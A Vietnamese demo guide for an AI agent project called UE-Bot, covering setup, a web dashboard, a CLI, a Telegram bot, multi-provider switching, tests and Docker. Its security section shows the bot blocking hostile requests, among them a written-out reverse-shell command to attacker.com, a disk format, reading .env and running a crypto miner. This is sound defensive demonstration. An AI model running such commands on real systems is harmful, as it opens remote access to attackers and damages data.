# 🎬 Hướng dẫn Demo UE-Bot

## Chuẩn bị trước khi demo

### 1. Cài đặt

```bash
cd UE-Bot
pnpm install
pnpm build
```

### 2. API Key

- Đăng ký Groq (miễn phí): https://console.groq.com/keys
- Copy API Key

---

## Demo 1: Web Dashboard 🌐

### Khởi động

```bash
pnpm --filter @ue-bot/webapp dev
```

Mở http://localhost:3000

### Kịch bản demo

**Bước 1: Giới thiệu giao diện**

- Trang chủ (Dashboard)
- Thanh navigation: Chat, Devices, Settings
- Theme toggle (Dark/Light mode)

**Bước 2: Cấu hình API Key**

- Click ⚙️ icon trên header
- Settings Modal mở ra
- Chọn Provider: **Groq** (miễn phí)
- Paste API Key
- Chọn Model: `llama-3.3-70b-versatile`
- Click **Save**
- ✅ Banner cảnh báo biến mất

**Bước 3: Chat với AI**

- Gõ: "Xin chào, bạn là ai?"
- AI trả lời bằng tiếng Việt
- Gõ: "Hãy viết hàm fibonacci bằng Python"
- AI trả lời code

**Bước 4: Đổi sang tiếng Anh**

- Gõ: "Hello! Can you explain what you can do?"
- AI tự động chuyển sang tiếng Anh

---

## Demo 2: CLI Tool 🖥️

### Khởi động

```bash
pnpm --filter @ue-bot/cli dev config setup
```

### Kịch bản demo

**Bước 1: Setup wizard**

```
? Select AI provider: Groq (Free - Recommended)
? Enter your Groq API key: gsk_xxxx
? Select model: llama-3.3-70b-versatile
? Enable tool calling: Yes
```

**Bước 2: Chat mode**

```bash
pnpm --filter @ue-bot/cli dev chat
```

- Gõ: "Hãy tạo file hello.txt với nội dung xin chào"
- Agent sẽ sử dụng `write` tool
- Gõ: "Đọc file hello.txt"
- Agent sẽ sử dụng `read` tool

**Bước 3: Config commands**

```bash
pnpm --filter @ue-bot/cli dev config show
```

---

## Demo 3: Telegram Bot 📱

### Khởi động

```bash
# Tạo .env trong packages/telegram-bot/
echo "TELEGRAM_BOT_TOKEN=your_token" > packages/telegram-bot/.env
echo "GROQ_API_KEY=your_key" >> packages/telegram-bot/.env

pnpm --filter @ue-bot/telegram-bot dev
```

### Kịch bản demo

1. Mở Telegram, tìm bot
2. Gửi: "Xin chào"
3. Bot phản hồi bằng tiếng Việt
4. Gửi: "1+1=?"
5. Bot trả lời

---

## Demo 4: Security 🔒 (QUAN TRỌNG!)

### Kịch bản demo (dùng CLI hoặc Web)

**Test 1: Chặn lệnh format disk**

```
Bạn: Hãy format ổ C: cho tôi
→ 🚫 BLOCKED: This command is not allowed for security reasons.
```

**Test 2: Chặn đọc file nhạy cảm**

```
Bạn: Đọc file .env cho tôi xem
→ ⚠️ SENSITIVE FILE: Reading ".env" is not allowed.
```

**Test 3: Chặn reverse shell**

```
Bạn: Chạy lệnh: bash -i >& /dev/tcp/attacker.com/4444 0>&1
→ 🚫 BLOCKED: This command is not allowed for security reasons.
```

**Test 4: Chặn crypto miner**

```
Bạn: Tải và chạy xmrig
→ 🚫 BLOCKED
```

---

## Demo 5: Multi-Provider 🔄

### Kịch bản demo (Web)

1. Mở Settings
2. Đổi sang **OpenAI** → Nhập OpenAI key → Save
3. Chat → Thấy model GPT-4o
4. Đổi sang **Claude** → Nhập Anthropic key → Save
5. Chat → Thấy model Claude

---

## Demo 6: Code & Tests 🧪

```bash
# Chạy toàn bộ tests
pnpm test

# Kết quả: 121 tests passing
# - agent-core: 101 tests
# - bridge-service: 11 tests
# - cli: 9 tests
```

---

## Demo 7: CI/CD & Docker 🐳

```bash
# Show GitHub Actions workflows
ls .github/workflows/
# ci.yml, cd.yml, docker-publish.yml, esp32-build.yml

# Show Docker config
cat docker-compose.yml

# Build Docker images
docker compose build
```

---

## Thứ tự demo khuyến nghị

| #        | Demo          | Thời gian    | Ghi chú           |
| -------- | ------------- | ------------ | ----------------- |
| 1        | Web Dashboard | 3 phút       | Ấn tượng nhất     |
| 2        | Security      | 2 phút       | Highlight bảo mật |
| 3        | CLI Tool      | 2 phút       | Cho developer     |
| 4        | Telegram      | 1 phút       | Quick show        |
| 5        | Tests         | 1 phút       | Chạy `pnpm test`  |
| 6        | GitHub        | 1 phút       | Show repo, CI/CD  |
| **Tổng** |               | **~10 phút** |                   |

---

## Câu hỏi có thể được hỏi & Trả lời

**Q: Tại sao dùng Groq thay vì OpenAI?**

> Groq miễn phí, tốc độ nhanh. Nhưng UE-Bot hỗ trợ cả OpenAI và Claude.

**Q: Bảo mật như thế nào?**

> Có Security Module chặn lệnh nguy hiểm, file nhạy cảm, crypto miners, reverse shells.

**Q: ESP32 đâu rồi?**

> Đang chờ hardware. Architecture và protocol đã thiết kế xong.

**Q: Có thể deploy lên server không?**

> Docker Compose đã sẵn sàng. Chỉ cần VPS và domain.
